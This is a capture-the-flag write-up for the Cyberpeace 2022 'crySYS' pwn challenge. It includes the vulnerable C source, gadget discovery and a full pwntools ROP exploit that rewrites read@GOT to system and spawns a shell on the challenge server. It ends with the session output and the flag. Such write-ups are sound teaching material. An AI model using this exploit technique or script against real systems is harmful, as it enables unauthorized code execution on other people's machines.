---
title: "Cyberpeace 2022 - Crysys (Pwn)"
header:
  overlay_image: /assets/images/cyberpeace-2022/header.jpg
  overlay_filter: 0.5
  caption: "Photo credit: Debashis RC Biswas on Unsplash"

tags:
  - tetctf
  - tetctf2022
  - writeup
  - pwn
  - stack canary
  - magic
  - srand
---

Summary: A minimal binary with only the read libc function and containing a standard stack overflow
can be exploited by leveraging a common add-what-where gadget to adjust GOT entries. This removes
the requirement for memory leaks. Additionally, the ret2dlresolve technique was investigated but
exploitation requires a missing write-at-an-offset gadget.

## Challenge Prompt

![Challenge Prompt]({{ site.url }}{{ site.baseurl }}/assets/images/cyberpeace-2022/crysys_prompt.png){: .align-center}

Attachment: [challenge file]({{ site.url }}{{ site.baseurl }}/assets/files/cyberpeace-2022/cbd2d300-dc64-4aae-8d51-671a6d0e5b5f.zip)

## Solution

Extracting the zip file shows that we have the following files:

```console
$ unzip -l cbd2d300-dc64-4aae-8d51-671a6d0e5b5f.zip
Archive:  cbd2d300-dc64-4aae-8d51-671a6d0e5b5f.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
      276  10-16-2020 17:59   crySYS.c
     8272  10-16-2020 17:41   crySYS
   170960  10-16-2020 17:41   ld-2.27.so
  2030544  10-16-2020 17:41   libc-2.27.so
---------                     -------
  2210052                     4 files
```

The source to the challenge is given as follows.

```c
#include <stdio.h>
#include <unistd.h>

//gcc -o challenge -no-pie -fno-stack-protector challenges.c
//LD_PRELOAD=./libc-2.27.so ./ld-2.27.so ./challenge

int not_vulnerable(){
	char buf[80];
    return read(0, buf, 0x1000);
}


int main(){
	not_vulnerable();
    return 0;
}
```

This actually looks like a rip-off of the `ret2dlresolve` sample in the [Pwntools
documentation](https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html). Unfortunately, we cannot
use the technique in its original form since the binary uses huge pages.

```console
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x /vagrant/cyberpeace/crysys/crySYS
0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- /vagrant/cyberpeace/crysys/crySYS
0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- /vagrant/cyberpeace/crysys/crySYS
0x00007ffff79e2000 0x00007ffff7bc9000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7bc9000 0x00007ffff7dc9000 0x00000000001e7000 --- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dc9000 0x00007ffff7dcd000 0x00000000001e7000 r-- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcd000 0x00007ffff7dcf000 0x00000000001eb000 rw- /lib/x86_64-linux-gnu/libc-2.27.so
0x00007ffff7dcf000 0x00007ffff7dd3000 0x0000000000000000 rw-
0x00007ffff7dd3000 0x00007ffff7dfc000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7fea000 0x00007ffff7fec000 0x0000000000000000 rw-
0x00007ffff7ff7000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /lib/x86_64-linux-gnu/ld-2.27.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤
```

There is a way to exploit this scenario, however we need either a leak or a gadget to write at an
offset to a dereferenced address. This is explored in this excellent author's writeup for
[devnull-as-a-service from redpwnCTF
2021](https://activities.tjhsst.edu/csc/writeups/redpwnctf-2021-devnull). However, the writeup also
mentions an interesting well-known gadget that appears in GCC compiled binaries:

```
add dword ptr [rbp - 0x3d], ebx
```

This turns out to be present in `crySYS` as well.

```console
$ ROPgadget --binary crySYS | grep '\[rbp -'
0x00000000004004c8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
```

Since this is an add-what-where primitive, we can use this to simply add an offset to the resolved
`read` libc address in the GOT such that it points to a useful function such as `system`.
Additionally, we can use a second stage with `read` to write an arbitrary string to execute in the
`.bss` section. Putting this together yields the following script:

```python
#!/usr/bin/env python

from pwn import *
from one_gadget import generate_one_gadget

# context.log_level = 'debug'
context.arch = 'amd64'

binary_path = "./crySYS"
libc_path = "./libc-2.27.so"
ld_path = "./ld-2.27.so"

# 0x00000000004004c8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
add_gadget = 0x00000000004004c8


def main():
    # Start the process/make the connection.
    # p = process([ld_path, binary_path], env={'LD_PRELOAD': libc_path})
    p = remote("152.96.7.6", 1337)

    # Calculate some useful values.
    libc_elf = ELF(libc_path)
    elf = ELF(binary_path)
    read_got = elf.got['read']
    libc_system = libc_elf.symbols['system']
    libc_read = libc_elf.symbols['read']
    log.info('system@libc: {}'.format(hex(libc_system)))
    log.info('read@libc: {}'.format(hex(libc_read)))
    system_offset = libc_system - libc_read
    log.info('system offset in libc from read: {}'.format(hex(system_offset)))
    system_offset = system_offset & 0xffffffffffffffff
    log.info('Twos complement of this offset: {}'.format(hex(system_offset)))

    # Determine a writable location.
    binsh_addr = elf.bss() + 0x10
    log.info('/bin/sh string Address: {}'.format(hex(binsh_addr)))

    # Construct the chain to use the add-what-where gadget and ret2csu to modify read@got to system.
    rop_chain = ROP(elf)
    # Read the address of read_got to the writable address we control to write the command.
    rop_chain.read(0, binsh_addr)
    # Setup the registers for the add-what-where. rbp has to account for the -0x3d
    rop_chain.ret2csu(edi=0xdeadbeef, rbx=system_offset, rbp=read_got + 0x3d)
    # Trigger the add-what-where to transform read@got to system.
    rop_chain.raw(add_gadget)
    # Fix up the aligning with a ret.
    rop_chain.raw(rop_chain.ret)
    # Call our system()
    rop_chain.read(binsh_addr)
    log.info(rop_chain.dump())

    # Send the first stage.
    log.info("Sending the first stage.")
    payload = flat({88: rop_chain.chain()}, filler=b'X')
    p.send(payload)

    # In the second stage, write the command we want to execute.
    # Using just /bin/sh alone seems to end in a segfault after the first command so let's get a
    # nicer shell.
    log.info("Sending the second stage.")
    command = b'/bin/sh -c "/bin/bash"\x00'
    p.send(command)

    # Obtain our shell.
    log.success("Enjoy your shell!")
    p.interactive()


if __name__ == '__main__':
    main()

```

Running the script gives us the flag.

```console
$ python exploit.py
[+] Opening connection to 152.96.7.6 on port 1337: Done
[*] '/vagrant/cyberpeace/crysys/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/vagrant/cyberpeace/crysys/crySYS'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] system@libc: 0x4f440
[*] read@libc: 0x110070
[*] system offset in libc from read: -0xc0c30
[*] Twos complement of this offset: 0xfffffffffff3f3d0
[*] /bin/sh string Address: 0x601040
[*] Loaded 14 cached gadgets for './crySYS'
[*] 0x0000:         0x400583 pop rdi; ret
    0x0008:              0x0 [arg0] rdi = 0
    0x0010:         0x400581 pop rsi; pop r15; ret
    0x0018:         0x601040 [arg1] rsi = 6295616
    0x0020:      b'iaaajaaa' <pad r15>
    0x0028:         0x4003f0 read
    0x0030:         0x40057a
    0x0038:              0x0
    0x0040:              0x1
    0x0048:         0x600e48
    0x0050:       0xdeadbeef
    0x0058:      b'waaaxaaa' rsi
    0x0060:      b'yaaazaab' rdx
    0x0068:         0x400560
    0x0070:      b'daabeaab' <add rsp, 8>
    0x0078: 0xfffffffffff3f3d0
    0x0080:         0x601055
    0x0088:      b'jaabkaab' r12
    0x0090:      b'laabmaab' r13
    0x0098:      b'naaboaab' r14
    0x00a0:      b'paabqaab' r15
    0x00a8:         0x4004c8
    0x00b0:         0x4003de ret
    0x00b8:         0x400583 pop rdi; ret
    0x00c0:         0x601040 [arg0] rdi = 6295616
    0x00c8:         0x4003f0 read
[*] Sending the first stage.
[*] Sending the second stage.
[+] Enjoy your shell!
[*] Switching to interactive mode
$ id
uid=1000(hacker) gid=1000(hacker) groups=1000(hacker)
$ uname -a
Linux 24ec36d4-ad5b-4eb5-8fcd-e00e61def718 3.10.0-1160.11.1.el7.x86_64 #1 SMP Fri Dec 18 16:34:56 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
$ ls -la
total 3144
drwxr-xr-x. 1 root root     185 Jan  4  2021 .
drwxr-xr-x. 1 root root      20 Jan  4  2021 ..
-rw-r--r--. 1 root root     220 Apr  4  2018 .bash_logout
-rw-r--r--. 1 root root    3771 Apr  4  2018 .bashrc
-rw-r--r--. 1 root root     807 Apr  4  2018 .profile
-rwxrwxr-x. 1 root root    8272 Oct 16  2020 crySYS
-rw-rw-r--. 1 root root     276 Oct 16  2020 crySYS.c
-rw-rw-r--. 1 root root  973583 Oct 16  2020 crysys.zip
-rw-rw-r--. 1 root root      39 Oct 16  2020 flag
-rwxrwxr-x. 1 root root  170960 Oct 16  2020 ld-2.27.so
-rw-rw-r--. 1 root root 2030544 Oct 16  2020 libc-2.27.so
-rwxrwxr-x. 1 root root     198 Oct 16  2020 run.sh
-rwxrwxr-x. 1 root root     100 Oct 16  2020 start.sh
$ cat flag
HL{PPPwned-7165-4679-8c39-cf7633bdf81b}$
```

**Flag:** `HL{PPPwned-7165-4679-8c39-cf7633bdf81b}`
